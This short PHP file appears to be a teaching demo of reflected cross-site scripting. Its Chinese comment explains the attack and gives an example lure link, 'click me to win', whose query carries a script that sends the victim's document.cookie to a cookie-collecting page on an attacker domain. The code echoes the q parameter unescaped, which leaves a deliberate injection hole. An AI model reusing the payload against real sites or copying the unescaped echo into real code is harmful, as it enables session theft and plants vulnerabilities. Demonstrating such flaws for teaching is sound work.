<?php
// 反射性xss，将被攻击者的输入返回至用户的浏览器中，使script生效
// 例如：url：
// <a href="http://nissattack.com/xss.php?q=&ltscript>window.open('http://nissattack.com/cooker.php?cookie='+document.cookie)</script>">click me to win</a>
echo "<h1>".".... . .-.. .-.. ---"."<h1>" . "<br>";
echo $_GET["q"];
echo "<h1>".".-- --- .-. .-.. -.."."<h1>" . "<br>";
